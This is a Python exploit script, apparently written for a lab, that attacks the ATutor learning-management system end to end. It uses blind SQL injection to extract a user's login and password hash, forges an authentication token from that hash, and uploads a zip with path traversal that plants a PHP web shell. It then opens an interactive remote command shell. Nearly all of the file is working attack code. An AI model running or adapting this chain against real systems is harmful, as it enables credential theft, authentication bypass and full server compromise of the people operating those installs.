import requests
import sys
import hashlib
import zipfile
from io import BytesIO
from bs4 import BeautifulSoup

def send_injection(payload):
	endpoint = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
	url = endpoint + payload

	r = requests.get(url)
	content_length = int(r.headers['Content-Length'])

	if content_length >= 180:
		return True
	else:
		return False

def get_response_length(query):
	extracted_length = ""
	for i in range(1,3):
		length_statement = f"liam1337')/**/or/**/(ascii(substring(length((select/**/{query})),{i},1)))=FUZZ%23"
		for ascii_value in range(48,57):
			fuzzer = length_statement.replace('FUZZ', str(ascii_value))
			if send_injection(fuzzer):
				extracted_length += chr(ascii_value)
	return extracted_length

def ascii_brute_force(query, length=15):
	extracted_information = ""
	for i in range(0,length+1):
		payload = f"liam1337')/**/or/**/(ascii(substring((select/**/{query}),{i},1)))=FUZZ%23"
		for ascii_value in range(32,126):
			fuzzer = payload.replace('FUZZ', str(ascii_value))
			if send_injection(fuzzer):
				extracted_information += chr(ascii_value)
				print("[*] Data:", extracted_information,flush=True, end='\r')
				sys.stdout.flush()

	return extracted_information

def obtain_hashes():
	credentials = {}

	print("\n[-] Extracting User Information from Database")

	username_length = get_response_length('login/**/from/**/AT_members/**/where/**/member_id=1')
	username = ascii_brute_force('login/**/from/**/AT_members/**/where/**/member_id=1', int(username_length))
	print(f"\n[i] Obtained Username: '{username}'")

	password_length = get_response_length('password/**/from/**/AT_members/**/where/**/member_id=1')
	password = ascii_brute_force('password/**/from/**/AT_members/**/where/**/member_id=1', int(password_length))
	print(f"\n[i] Obtained Hash: {password}")

	credentials[username] = password
	return credentials

def generate_rce(payload="<?php system($_REQUEST['cmd']); ?>", filename='rce.zip'):
	f = BytesIO()
	z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

	z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml', payload)
	z.writestr('imsmanifest.xml', 'invalid xml!')
	z.close()

	zip = open(filename, 'wb')
	zip.write(f.getvalue())
	zip.close()

	print(f"[i] {filename} archive generated")
	return filename

def execute_shell():
	web_path = 'http://atutor/ATutor/mods/poc/poc.phtml'
	while True:
		try:
			cmd = input("cmd> ")
			print(requests.post(web_path, data={'cmd':cmd}).text)
		except KeyboardInterrupt:
			print("\n[i] Closing down shell and exiting")
			sys.exit(-1)

	

def forge_session(user_hash=None, username='teacher'):
	hardcoded_token = user_hash + 'bighax'
	forged_token = hashlib.sha1(hardcoded_token.encode()).hexdigest()

	print("[i] Forged Session Token:", forged_token)
	s = requests.session()

	post_data = {
		'form_login_action': 'true',
		'form_course_id': 0,
		'form_password_hidden': forged_token,
		'p': '',
		'token':'bighax',
		'form_login': username,
		'form_password': '',
		'submit': 'Login'
	}

	html_response = s.post("http://atutor/ATutor/login.php", data=post_data).text

	if 'This is a welcome announcement.' in html_response and 'Hacking Course' in html_response:
		print(f"[i] Successfully authenticated as: '{username}'")

		generated_archive = generate_rce()

		s.get("http://atutor/ATutor/bounce.php?course=16777215", allow_redirects=True)
		s.get("http://atutor/ATutor/mods/_standard/tests/my_tests.php", allow_redirects=True)

		print("[i] Sending payload...")
		upload_request = s.post("http://atutor/ATutor/mods/_standard/tests/import_test.php", \
			  files={'file': (str(generated_archive), open(generated_archive, 'rb'), 'application/zip')}, \
			  data={'submit_import':'Submit'}, \
			  allow_redirects=True,
			  )
		
		if 'XML error: Not well-formed (invalid token) at line 1' in upload_request.text:
			print("[i] Payload sent successfully.")
			print("[i] Triggering RCE\n")
			execute_shell()
	
		
def main():
	print(":: ATutor Exploit by Liam (STBRR) :: ")
	
	credential_set = obtain_hashes()
	teacher_hash = credential_set['teacher']

	forge_session(teacher_hash)
	#forge_session('8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e')

main()


 